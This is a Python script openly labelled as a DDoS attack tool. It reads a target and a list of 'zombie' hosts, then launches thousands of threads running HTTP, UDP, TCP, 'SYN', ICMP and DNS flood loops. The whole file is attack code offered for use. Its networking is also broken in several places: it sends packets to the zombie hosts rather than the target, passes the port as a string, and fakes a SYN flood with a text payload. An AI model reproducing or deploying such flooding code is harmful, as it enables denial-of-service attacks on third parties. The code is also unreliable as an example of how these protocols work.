import socket
import threading
import time
import random
import sys
import os

# Set the target URL and port
target_url = input("Target url: ")
target_port = input("Port(80): ")

# Set the number of threads to use
num_threads = 10000

# Set the duration of the attack in seconds
attack_duration = 60

# Create a list to hold the zombie URLs
zombie_urls = []

# Open the text file with the zombie URLs
with open("zombies.txt", "r") as file:
    for line in file:
        zombie_urls.append(line.strip())

# Create a function to send HTTP requests to the target URL
def http_flood():
    while True:
        # Choose a random zombie URL
        zombie_url = random.choice(zombie_urls)
        
        # Create a TCP socket and connect to the zombie URL
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((zombie_url, target_port))
        
        # Send an HTTP request to the target URL
        http_request = f"GET / HTTP/1.1\r\nHost: {target_url}\r\n\r\n"
        sock.send(http_request.encode())
        
        # Receive the HTTP response
        response = sock.recv(4096)
        
        # Print the response
        print(response.decode())
        
        # Close the socket
        sock.close()

# Create a function to send UDP packets to the target URL
def udp_flood():
    while True:
        # Choose a random zombie URL
        zombie_url = random.choice(zombie_urls)
        
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Send a UDP packet to the zombie URL
        udp_packet = b"UDP packet from zombie to target"
        sock.sendto(udp_packet, (zombie_url, target_port))
        
        # Close the socket
        sock.close()

# Create a function to send TCP packets to the target URL
def tcp_flood():
    while True:
        # Choose a random zombie URL
        zombie_url = random.choice(zombie_urls)
        
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((zombie_url, target_port))
        
        # Send a TCP packet to the zombie URL
        tcp_packet = b"TCP packet from zombie to target"
        sock.send(tcp_packet)
        
        # Close the socket
        sock.close()

# Create a function to send SYN packets to the target URL
def syn_flood():
    while True:
        # Choose a random zombie URL
        zombie_url = random.choice(zombie_urls)
        
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        
        # Send a SYN packet to the zombie URL
        syn_packet = b"SYN packet from zombie to target"
        sock.sendto(syn_packet, (zombie_url, target_port))
        
        # Receive the SYN-ACK response
        response = sock.recv(4096)
        
        # Print the response
        print(response.decode())
        
        # Close the socket
        sock.close()

# Create a function to send ICMP packets to the target URL
def icmp_flood():
    while True:
        # Choose a random zombie URL
        zombie_url = random.choice(zombie_urls)
        
        # Create a raw socket for sending ICMP packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        # Send an ICMP packet to the zombie URL
        icmp_packet = b"ICMP packet from zombie to target"
        sock.sendto(icmp_packet, (zombie_url, target_port))
        
        # Receive the ICMP response
        response = sock.recv(4096)
        
        # Print the response
        print(response.decode())
        
        # Close the socket
        sock.close()

# Create a function to send DNS packets to the target URL
def dns_flood():
    while True:
        # Choose a random zombie URL
        zombie_url = random.choice(zombie_urls)
        
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Send a DNS packet to the zombie URL
        dns_packet = b"DNS packet from zombie to target"
        sock.sendto(dns_packet, (zombie_url, target_port))
        
        # Receive the DNS response
        response = sock.recv(4096)
        
        # Print the response
        print(response.decode())
        
        # Close the socket
        sock.close()

# Create a list to hold the threads
threads = []

# Create threads for HTTP flooding
for _ in range(num_threads // 6):
    t = threading.Thread(target=http_flood)
    threads.append(t)

# Create threads for UDP flooding
for _ in range(num_threads // 6):
    t = threading.Thread(target=udp_flood)
    threads.append(t)

# Create threads for TCP flooding
for _ in range(num_threads // 6):
    t = threading.Thread(target=tcp_flood)
    threads.append(t)

# Create threads for SYN flooding
for _ in range(num_threads // 6):
    t = threading.Thread(target=syn_flood)
    threads.append(t)

# Create threads for ICMP flooding
for _ in range(num_threads // 6):
    t = threading.Thread(target=icmp_flood)
    threads.append(t)

# Create threads for DNS flooding
for _ in range(num_threads // 6):
    t = threading.Thread(target=dns_flood)
    threads.append(t)

# Start all the threads
for t in threads:
    t.start()

# Wait for the specified duration of the attack
time.sleep(attack_duration)

# Stop all the threads
for t in threads:
    t.join()

print("DDoS attack finished.")                                                                   
